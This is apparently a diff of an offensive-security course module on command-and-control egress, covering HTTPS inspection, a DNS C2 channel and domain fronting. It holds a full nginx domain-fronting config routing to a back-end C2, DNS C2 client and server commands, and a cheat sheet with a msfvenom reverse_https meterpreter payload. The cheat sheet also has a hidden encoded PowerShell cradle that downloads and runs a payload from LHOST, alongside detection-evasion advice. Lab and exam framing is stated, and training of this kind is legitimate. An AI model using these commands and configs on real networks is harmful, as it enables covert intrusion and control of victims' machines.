-        location / { return 200 "ok\n"; }
-    }
-}
-
-# ============================================================
-# Optional: SNI split routing in the stream block (requires nginx built with --with-stream_ssl_preread)
-# Purpose: on the same port, traffic with SNI=DOMAIN goes to the back-end C2 and any other SNI goes to a local decoy site.
-# Use this or the http block above, not both; if you enable both, give port 443 to stream (change the http block to listen 8443 or similar).
-# ============================================================
-# stream {
-#     log_format sni '$remote_addr sni=$ssl_preread_server_name -> $upstream_addr';
-#     access_log /var/log/nginx/fronting-sni.log sni;
-#
-#     map $ssl_preread_server_name $sni_upstream {
-#         default        127.0.0.1:8080;    # no match: local decoy site
-#         "DOMAIN"       LHOST:LPORT;       # SNI=DOMAIN: back-end C2 (the back-end terminates TLS itself)
-#     }
-#
-#     server {
-#         listen 443;
-#         ssl_preread on;                   # read SNI only, no TLS termination
-#         proxy_pass $sni_upstream;
-#     }
-# }
-
-# ============================================================
-# Verification steps (do one harmless GET before the exam)
-#   1) confirm from the target that only DOMAIN is permitted:
-#        curl -sI https://DOMAIN/            -> expect 200 "ok"
-#   2) fetch the payload with the back-end Host (SNI is still DOMAIN):
-#        curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
-#   3) the back-end log (the log from m09-https-listener.sh --mode serve) should show that request, with Host=URL
-#   4) PowerShell form (as written in the scenario 33 docs):
-#        $c = New-Object Net.WebClient; $c.Headers.Add("Host","URL");
-#        $c.DownloadString("https://DOMAIN/PAYLOAD")
-#
-# Triage order when it does not work
-#   - 421/403/502 returned: the front-end (or the real CDN) validated SNI against Host -> that infrastructure does not support domain fronting; switch to scenario 28 (proxy) or 32 (DNS)
-#   - certificate error: the client must ignore certificate validation (curl -k / PowerShell ServerCertificateValidationCallback),
-#     otherwise you must hold a trusted certificate for DOMAIN
-#   - no back-end log: check whether LHOST:LPORT in the upstream is really listening (ss -ltnp), and whether the map matched $is_backend
-# ============================================================
-````
-
-**Validation**: the handshake log shows the target completing TLS (or msf shows a session); the difference between "the target reaches public HTTPS fine" and "the target fails against us" has been explained and eliminated.
-
-**Failure branches and alternatives**:
-- The middlebox re-signs and the chain is validated → find a domain the middlebox allows and use domain fronting (33), or check whether the lab grants an exemption.
-- The egress whitelists by SNI/destination IP → domain fronting (33); if it will not even resolve non-whitelisted domains → DNS channel (32).
-- The client skips validation but the handshake still fails → check the TLS version and cipher suites (WinHTTP defaults are usually fine; older systems may need a downgraded configuration).
-
-**Exam / OPSEC notes**: a self-signed fingerprint stands out — when troubleshooting, first confirm the fingerprint in the listener log is yours. Keep the UA consistent with the delivery/download stages instead of mixing a default and a disguise. HTTPS does not encrypt the Host/SNI that a proxy sees, so never put secrets in the URL.
-
----
-
-## Scenario 32: Plain HTTP(S) is dead, but the course lab allows a DNS channel
-
-**Situation**: the target executes code, but neither direct connections nor the usual proxy work; DNS egress still does.
-
-**Assumptions**: the lab/exam environment explicitly allows a DNS tunnel (course text §14.7); you have a domain (or a domain allowed inside the lab network) and can point its NS records at the attacker box, or the target can reach the attacker directly on UDP 53; the target can run our client (Python 3 needs an interpreter — without one, switch to dnscat2/iodine or the PowerShell port described in the script comments).
-
-**Prepare (attacker side)**: this module ships a minimal DNS C2 pair (`m09-dns-c2-server.py` + `m09-dns-c2-client.py`) for "confirm the DNS channel works + push commands and pull output back". Bring in a full tunnel tool such as dnscat2/iodine only if you need one. This lab has the target talk straight to the attacker box on UDP 53:
+- [ ] Confirm DNS reachability: `nslookup c2.example LHOST` (direct) or a normal recursive `nslookup`
+- [ ] Start the authoritative-style DNS C2 server (binding 53 needs root)
+- [ ] Start the client with a session ID
+- [ ] Issue a command from the server console; confirm output under `o<hex>` (keep one command's output within 1–2 KB)
+- [ ] Once stable, deliver stage 2 over DNS as well, or use DNS only for emergency return traffic
 
 ```bash
 # attacker machine: start the authoritative-style DNS C2 server (binding 53 needs root)
@@ -1127,24 +931,18 @@ sudo python3 m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
 # type into the server console:  SESSIONID  whoami /priv     # send a command to that session
 ```
 
-**Procedure**:
-1. Confirm DNS reachability from the target: `nslookup c2.example LHOST` (direct) or normal recursive `nslookup`, depending on the environment.
-2. Start the client on the target (with no Python, deliver an interpreter first or switch to the dnscat2 binary):
 ```bash
 python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
     --session a1b2c3d4 --interval 2
 ```
-3. The client heartbeat carries the session ID → issue a command to that session from the server console → the client decodes and runs it locally → the output travels back in chunks under the `o<hex>` label (keep one command's output within 1–2 KB; split anything larger).
-4. Confirm the server received the output (printed to the console, or written under outdir). At the egress a DNS query is just an ordinary A query; it never crosses the proxy.
-5. Once the channel is stable, deliver stage 2 over DNS as well (nothing to disk, few requests), or use DNS only for emergency return traffic.
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-dns-c2-server.py` | DNS C2 server (UDP 53, answers with A records) | `--listen 0.0.0.0 --port 53 --domain c2.example` |
-| `m09-dns-c2-client.py` | DNS C2 client (heartbeat, receive commands, return output) | `--server LHOST --session a1b2c3d4 --interval 2` |
+The client heartbeat carries the session ID → the server issues a command → the client decodes and runs it locally → output travels back in chunks under the `o<hex>` label. At the egress a DNS query is just an ordinary A query; it never crosses the proxy. Confirm with `tcpdump -i eth0 udp port 53` (`x.<session>.c2.example` queries) and the server console (`[+] session ...` plus printed output).
 
-#### `m09-dns-c2-server.py`
+If the egress only resolves internal names, or forces internal DNS, can that resolver forward `c2.example` to your authoritative server? If not, this path is dead — go back to proxy or HTTPS. If the tunnel is blocked (request-rate or long-label detection), raise `--interval`, shorten the per-packet payload, and keep commands few and precise. If UDP 53 is blocked but TCP 53 works, you need a tunnel tool that supports TCP (dnscat2 does); this script only covers UDP.
+
+Long hex subdomains plus a high heartbeat rate are strong detection signatures — use them only where the lab rules allow it. Do not pull large command output in one go. Before starting the DNS server on 53, confirm the port is free and that the target's egress policy does not block it separately.
+
+::: details `m09-dns-c2-server.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -1336,7 +1134,8 @@ if __name__ == "__main__":
     main()
 ````
 
-#### `m09-dns-c2-client.py`
+:::
+::: details `m09-dns-c2-client.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -1605,25 +1404,16 @@ if __name__ == "__main__":
 # ============================================================
 ````
 
-**Validation**: the server console receives the session heartbeat (`[+] session ...`) and prints command output; `tcpdump -i eth0 udp port 53` shows regular `x.<session>.c2.example` queries.
+:::
+## Destination domains restricted, front end is allowed
 
-**Failure branches and alternatives**:
-- The egress only resolves internal names, or forces internal DNS → can that internal DNS forward `c2.example` to your authoritative server? If not, this scenario is dead (switch to 28/31).
-- No Python interpreter on the target → use a compiled dnscat2 client, or port the client logic to PowerShell (with `Resolve-DnsName`); the script header comments list the porting points.
-- The tunnel is blocked (request-rate or long-label detection) → raise `--interval`, shorten the per-packet payload, and keep commands few and precise.
-- UDP 53 is blocked but TCP 53 works → you need a tunnel tool that supports TCP (dnscat2 does); our own script only covers UDP.
+If the target may only reach a specific front-end address and the back end is unreachable directly, and the lab infrastructure supports front-end / back-end separation (course §14.6), use domain fronting. Egress inspection sees the TLS SNI and destination as FRONT (allowed); the HTTP Host header carries the back-end routing.
 
-**Exam / OPSEC notes**: long hex subdomains plus a high heartbeat rate are strong detection signatures — use them only where the lab rules allow it (the scenario assumptions state that the course lab permits it). Do not pull large command output in one go. Before starting the DNS server on 53, confirm the port is free and that the target's egress policy does not block it separately.
-
----
-
-## Scenario 33: The target restricts destination domains, and the lab infrastructure supports domain fronting
-
-**Situation**: the target may only reach a specific front-end address and the back end is unreachable directly; the lab infrastructure supports front-end/back-end separation (course text §14.6).
-
-**Assumptions**: you have a front-end address the target **is allowed to reach** (the FRONT domain/IP); some facility can route requests to the back end by HTTP Host header — a real CDN (Azure Front Door, for example) or a self-built nginx reverse proxy; the back end is your C2/delivery server. **What makes domain fronting work**: the egress inspection sees the TLS SNI and destination address as FRONT (allowed), while the HTTP Host header carries the back-end routing.
-
-**Prepare (attacker side)**: a self-built lab front-end nginx (443 + a FRONT certificate) plus a back-end listener:
+- [ ] From the target, confirm FRONT:443 is reachable and the back end is not reachable directly
+- [ ] Start a front-end nginx (443 + a FRONT certificate) and a back-end HTTPS listener
+- [ ] Client: TLS to FRONT, HTTP Host pointing at the back end
+- [ ] Verify with a harmless GET before any payload (back-end log shows Host=BACKEND)
+- [ ] For a real CDN: register BACKEND as the origin, use the allowed domain as the front end, and verify routing the same way
 
 ```bash
 # nginx frontend config, see m09-domain-fronting-nginx.conf
@@ -1632,77 +1422,207 @@ bash m09-https-listener.sh --mode ssl-test --cert cert.pem --key key.pem --port 
 # or msf: use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; run
 ```
 
-**Procedure**:
-1. From the target, confirm FRONT:443 is reachable (`Test-NetConnection FRONT -Port 443`) and that the back end is not directly reachable.
-2. Client template — TLS to FRONT, HTTP Host header pointing at the back end:
 ```bash
 # target-side curl (bundled with Windows 10+)
 curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD
 ```
+
 ```powershell
 # or a PowerShell downloader/callback, with the Host header pointing at the backend vhost
 # $c = New-Object Net.WebClient; $c.Headers.Add("Host","BACKEND"); $c.DownloadString("https://FRONT/PAYLOAD")
 ```
-3. The nginx front end routes by Host: Host=FRONT → the normal page (cover); Host=BACKEND → `proxy_pass` to the back-end listener. At the egress only FRONT is visible (SNI, certificate and destination domain all match the allow rule).
-4. Validation: the back-end listener receives the request from the target (the source is the front-end IP or the target IP, depending on where the proxy sits); the download or session succeeds.
-5. Real-CDN variant: register BACKEND as the CDN origin, use the domain the target allows as the front end, and verify the routing with a harmless GET before you send a payload.
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m09-domain-fronting-nginx.conf` | Self-built domain-fronting front end (routes to the back end by Host) | replace FRONT / BACKEND / certificate paths |
-| `m09-https-listener.sh` | Back-end HTTPS listener/delivery | `--port 8443` |
-| `m09-proxy-aware-downloader.ps1` | Download on the target side (can set the Host header) | `-Url https://FRONT/PAYLOAD -HostHeader BACKEND` |
+The nginx front end routes by Host: Host=FRONT → the normal page (cover); Host=BACKEND → `proxy_pass` to the back-end listener. At the egress only FRONT is visible (SNI, certificate, and destination domain all match the allow rule). `m09-proxy-aware-downloader.ps1 -Url https://FRONT/PAYLOAD -HostHeader BACKEND` is the target-side helper.
 
-**Validation**: the back-end listener/nginx log shows the target's request with Host=BACKEND; the harmless GET works before you send a real payload; the egress side (if you get a chance to capture there) shows only FRONT.
+The back-end listener or nginx log should show the target's request with Host=BACKEND. The source may be the front-end IP or the target IP, depending on where the proxy sits.
 
-**Failure branches and alternatives**:
-- The front end routes by SNI instead of Host, or checks that SNI and Host agree → domain fronting is unavailable → fall back to scenario 28 (proxy) or 32 (DNS).
-- The CDN does not forward a custom Host (many return 502 or refuse) → that lab infrastructure does not support it; use a self-built front end, or drop the approach.
-- The target only allows FRONT and FRONT is not a domain whose certificate you control → you would have to borrow its certificate chain, which is normally impossible → change channel.
+If the front end routes by SNI instead of Host, or checks that SNI and Host agree (421 / 403 / 502), domain fronting is unavailable — fall back to the proxy or DNS. If a CDN will not forward a custom Host (many return 502 or refuse), that infrastructure does not support it; use a self-built front end, or drop the approach. If the target only allows FRONT and FRONT is not a domain whose certificate you control, you would have to borrow its certificate chain, which is normally impossible — change channel.
 
-**Exam / OPSEC notes**: scenario 33 is **infrastructure-dependent** (the original scenario states plainly that it "depends on specific service support") — verify the routing once with a harmless GET before the exam, and do not make a payload your first attempt during it. Domain fronting requires understanding the Host/SNI split; if you cannot explain the mechanism, do not force it into your report.
+This path is **infrastructure-dependent** — verify the routing once with a harmless GET before the exam, and do not make a payload your first attempt during it. If you cannot explain the Host / SNI split, do not force it into a report.
 
----
+::: details `m09-domain-fronting-nginx.conf` · click to expand
 
-## Module quick-reference notes
+````nginx
+# Purpose: domain fronting front-end config -- the TLS layer uses the front-end domain DOMAIN that the target permits (SNI + certificate),
+#       the HTTP Host header carries the real back-end identifier URL, and nginx forwards the request to the back-end C2 (LHOST:LPORT) by Host.
+#       egress inspection sees SNI/certificate/destination = DOMAIN (permitted); the back-end is decided only inside nginx by Host.
+# Scenario: 33 (target permits only specific front-end addresses, direct back-end connection fails; lab infrastructure supports front-end/back-end separation), 31 (HTTPS inspection bypass)
+# Dependencies: nginx (SNI split routing in the stream block needs the --with-stream_ssl_preread module; without that module, the http block alone can do Host-based split routing);
+#       a TLS certificate for DOMAIN (self-signed works if the target does not validate or we already ignore certificate validation); back-end C2/delivery listener (m09-https-listener.sh)
+# Usage:
+#   1) replace all placeholders, then put it at /etc/nginx/nginx.conf (or include the http{} contents into an existing config)
+#   2) nginx -t && nginx -s reload
+#   3) verify from the target: curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
+# Placeholders: DOMAIN=front-end domain (the target is allowed to reach it; used for SNI and the certificate), URL=back-end identifier (put it in the Host header, nginx routes by it),
+#         LHOST=back-end C2 listen address, LPORT=back-end C2 port, PAYLOAD=delivered file name
+# Test status: not tested on a local nginx; the config structure was checked by hand against nginx syntax (map / upstream / if+proxy_pass usage)
+
+worker_processes auto;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    default_type application/octet-stream;
+    sendfile on;
+    keepalive_timeout 15;
+
+    # ---- Back-end identifier check: Host header equal to URL goes to the back-end; anything else (including DOMAIN itself) returns the cover page ----
+    # in nginx "1" is true / "0" is false, so use 0/1 here instead of yes/no
+    map $http_host $is_backend {
+        default        0;
+        "URL"          1;
+    }
+
+    upstream c2_backend {
+        server LHOST:LPORT;
+        keepalive 8;
+    }
+
+    # ---- Triage log: records SNI, Host and UA together (scenario 31 triage for "handshake succeeds but the request is blocked") ----
+    log_format fronting '$remote_addr [$time_local] sni=$ssl_server_name '
+                        'host=$http_host ua="$http_user_agent" '
+                        'proto=$ssl_protocol req="$request" status=$status backend=$is_backend';
+    access_log /var/log/nginx/fronting-access.log fronting;
+    error_log  /var/log/nginx/fronting-error.log warn;
+
+    # ---- Front-end: terminates TLS on 443, the certificate belongs to DOMAIN ----
+    server {
+        listen 443 ssl default_server;
+        server_name DOMAIN;
+
+        ssl_certificate     /etc/nginx/certs/DOMAIN.crt;
+        ssl_certificate_key /etc/nginx/certs/DOMAIN.key;
+        ssl_protocols       TLSv1.2 TLSv1.3;
+        ssl_prefer_server_ciphers off;
+        ssl_session_cache   shared:fronting:1m;
+
+        # SNI notes (important):
+        #   - the client must make SNI = DOMAIN (with curl, specify --resolve DOMAIN:443:LHOST; with PowerShell just use https://DOMAIN/)
+        #   - if the client also sets SNI to URL, egress inspection sees a domain that is not permitted and domain fronting fails
+        #   - nginx $ssl_server_name is only for logging; this config does no SNI validation (otherwise it would reject Host=URL requests)
+
+        # do not let buffering truncate large requests (staged payload / uploads)
+        client_max_body_size 64m;
+        proxy_request_buffering off;
+        proxy_buffering off;
+
+        # the cover response and the back-end response are both returned as plain text so the site does not look anomalous
+        default_type text/plain;
+
+        # explicit path entry: even if the Host check fails, a fixed path can still forward to the back-end (handy for a quick pre-exam check)
+        location = /PAYLOAD {
+            proxy_pass http://c2_backend;
+            proxy_http_version 1.1;
+            proxy_set_header Host              $http_host;
+            proxy_set_header X-Forwarded-For   $remote_addr;
+            proxy_set_header X-Forwarded-Proto https;
+            proxy_set_header Connection        "";
+        }
+
+        location / {
+            # Host=URL -> forward to the back-end C2; keep the original Host so the back-end can identify its own vhost by Host
+            if ($is_backend) {
+                proxy_pass http://c2_backend;
+                proxy_http_version 1.1;
+                proxy_set_header Host              $http_host;
+                proxy_set_header X-Forwarded-For   $remote_addr;
+                proxy_set_header Connection        "";
+                break;
+            }
+
+            # any other Host (including a normal visit to DOMAIN) -> return a harmless page as cover
+            return 200 "ok\n";
+        }
+    }
+
+    # ---- Plaintext 80: only for local/nginx self connectivity tests, no forwarding ----
+    server {
+        listen 80 default_server;
+        server_name DOMAIN;
+        location / { return 200 "ok\n"; }
+    }
+}
+
+# ============================================================
+# Optional: SNI split routing in the stream block (requires nginx built with --with-stream_ssl_preread)
+# Purpose: on the same port, traffic with SNI=DOMAIN goes to the back-end C2 and any other SNI goes to a local decoy site.
+# Use this or the http block above, not both; if you enable both, give port 443 to stream (change the http block to listen 8443 or similar).
+# ============================================================
+# stream {
+#     log_format sni '$remote_addr sni=$ssl_preread_server_name -> $upstream_addr';
+#     access_log /var/log/nginx/fronting-sni.log sni;
+#
+#     map $ssl_preread_server_name $sni_upstream {
+#         default        127.0.0.1:8080;    # no match: local decoy site
+#         "DOMAIN"       LHOST:LPORT;       # SNI=DOMAIN: back-end C2 (the back-end terminates TLS itself)
+#     }
+#
+#     server {
+#         listen 443;
+#         ssl_preread on;                   # read SNI only, no TLS termination
+#         proxy_pass $sni_upstream;
+#     }
+# }
+
+# ============================================================
+# Verification steps (do one harmless GET before the exam)
+#   1) confirm from the target that only DOMAIN is permitted:
+#        curl -sI https://DOMAIN/            -> expect 200 "ok"
+#   2) fetch the payload with the back-end Host (SNI is still DOMAIN):
+#        curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
+#   3) the back-end log (the log from m09-https-listener.sh --mode serve) should show that request, with Host=URL
+#   4) PowerShell form (as written in the scenario 33 docs):
+#        $c = New-Object Net.WebClient; $c.Headers.Add("Host","URL");
+#        $c.DownloadString("https://DOMAIN/PAYLOAD")
+#
+# Triage order when it does not work
+#   - 421/403/502 returned: the front-end (or the real CDN) validated SNI against Host -> that infrastructure does not support domain fronting; switch to scenario 28 (proxy) or 32 (DNS)
+#   - certificate error: the client must ignore certificate validation (curl -k / PowerShell ServerCertificateValidationCallback),
+#     otherwise you must hold a trusted certificate for DOMAIN
+#   - no back-end log: check whether LHOST:LPORT in the upstream is really listening (ss -ltnp), and whether the map matched $is_backend
+# ============================================================
+````
+
+:::
+## Cheat sheet
 
 ```bash
-# embedded payload (scenario 17)
+# embedded payload (no stable egress)
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1
 
-# encode a PowerShell command (scenario 17/28/31; quick-reference notes: Encode PowerShell Payloads)
+# encode a PowerShell command (quote the blob; an unquoted <BASE64> is a shell redirection error)
 PS_CMD='iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))'
 B64=$(printf '%s' "$PS_CMD" | iconv -t UTF-16LE | base64 -w 0)
-# run it on the target (quote the blob; an unquoted <BASE64> is a shell redirection error)
 powershell -nop -w hidden -enc "$B64"
 
-# view/set proxy (scenario 28/29)
+# view / set proxy (user WinINet vs SYSTEM WinHTTP)
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
 netsh winhttp show proxy && netsh winhttp set proxy proxy-server=http://proxy:8080 && netsh winhttp reset proxy
 
-# proxy-aware download (scenario 28/29/31)
+# proxy-aware download
 powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -Command -DefaultCreds
 
-# DNS channel (scenario 32, start 53 as root)
+# DNS channel (start 53 as root)
 sudo python3 m09-dns-c2-server.py --domain c2.example
 python3 m09-dns-c2-client.py --server LHOST --session a1b2c3d4
 
-# domain fronting access template (scenario 33)
+# domain fronting access template
 curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOAD
 
-# HTTPS listener (scenario 30/31/33)
+# HTTPS listener
 bash m09-https-listener.sh --mode msf --cert cert.pem --key key.pem
 ```
 
-## Related lab files
-
-| Script | Scenarios |
+| Script | Use when |
 |---|---|
-| `m09-proxy-aware-downloader.ps1` | 28, 29, 30, 31 |
-| `m09-dns-c2-server.py` | 32 |
-| `m09-dns-c2-client.py` | 32 |
-| `m09-domain-fronting-nginx.conf` | 33, 31 |
-| `m09-https-listener.sh` | 30, 31, 33 |
+| `m00-delivery-server.py` | Delivery and request log (no-egress / proxy / stage-2) |
+| `m01-shellcode-runner-vba-archbranch.vba` | Embedded runner when downloads fail |
+| `m03-dotnettojscript-loader.js` | In-memory JScript / C# bridge |
+| `m09-proxy-aware-downloader.ps1` | User or SYSTEM must go through a proxy; HTTPS cert skip |
+| `m09-https-listener.sh` | HTTPS / TLS handler, delivery, or handshake log |
+| `m09-dns-c2-server.py` / `m09-dns-c2-client.py` | HTTP(S) dead, DNS still works |
+| `m09-domain-fronting-nginx.conf` | Destination domains restricted; front end is allowed |
 
-Cross-module references: `m00-delivery-server.py` (delivery and logging for 17/28/30), `m01-shellcode-runner-vba-archbranch.vba` (embedded, 17), `m03-dotnettojscript-loader.js` (bridge, 17), [08-pivoting-tunneling](/modules/08-pivoting-tunneling) (tunnelling alternatives for 29/30).
+Tunnelling alternatives when a SYSTEM or stage-2 path still cannot egress: [08-pivoting-tunneling](/modules/08-pivoting-tunneling).
